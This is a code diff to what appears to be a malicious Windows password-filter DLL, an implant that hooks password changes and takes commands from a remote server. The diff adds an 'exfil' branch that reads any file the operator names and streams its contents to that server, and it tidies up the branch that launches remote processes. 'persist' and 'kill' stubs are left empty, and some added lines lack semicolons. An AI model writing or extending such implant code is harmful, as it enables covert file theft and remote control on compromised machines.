@@ -145,23 +145,48 @@ BOOLEAN WINAPI PasswordFilter(PUNICODE_STRING account_name, PUNICODE_STRING full
                 &si,
                 &pi
             );
+
             if (!process_make_attempt){
                 log_to_server("ATTEMPT TO EXEC FILE PATH FAILED!");
+            } else {
+                log_to_server("PROCESS HAS BEEN MADE FOR THE FILE YOU POINTED TO");
                 CloseHandle(pi.hProcess);
                 CloseHandle(pi.hThread);
             }
 
-            log_to_server("PROCESS HAS BEEN MADE FOR THE FILE YOU POINTED TO");
-            CloseHandle(pi.hProcess);
-            CloseHandle(pi.hThread);
-
         } else if (wcscmp(tokens[1], L"exfil") == 0) {
 
-            
+            HANDLE hFile = CreateFileW(
+                tokens[2],  // path
+                GENERIC_READ,               // read access
+                FILE_SHARE_READ,            // allow others to read simultaneously
+                NULL,                       // default security
+                OPEN_EXISTING,              // only open if it exists
+                FILE_ATTRIBUTE_NORMAL,      // normal file
+                NULL                        // no template
+            );
+
+            if (hFile == INVALID_HANDLE_VALUE) {
+                log_to_server("FAILED TO OPEN REQUESTED FILE TO READ INTO")
+            } else {
+                char buf[4096];
+                DWORD bytesRead;
+
+                log_to_server("\n\n======================= REQUESTED FILE CONTENTS =========================================\n\n")
+                while (ReadFile(hFile, buf, sizeof(buf) - 1, &bytesRead, NULL) && bytesRead > 0) {
+                    
+                    buf[bytesRead] = '\0';
+                    log_to_server(buf);
+                
+                }
+                log_to_server("\n\n======================= END OF REQUESTED FILE CONTENTS ==================================\n\n")
+
+                CloseHandle(hFile);
+            }
 
         } else if (wcscmp(tokens[1], L"persist") == 0) {
 
-
+            
 
         } else if (wcscmp(tokens[1], L"kill") == 0) {
 
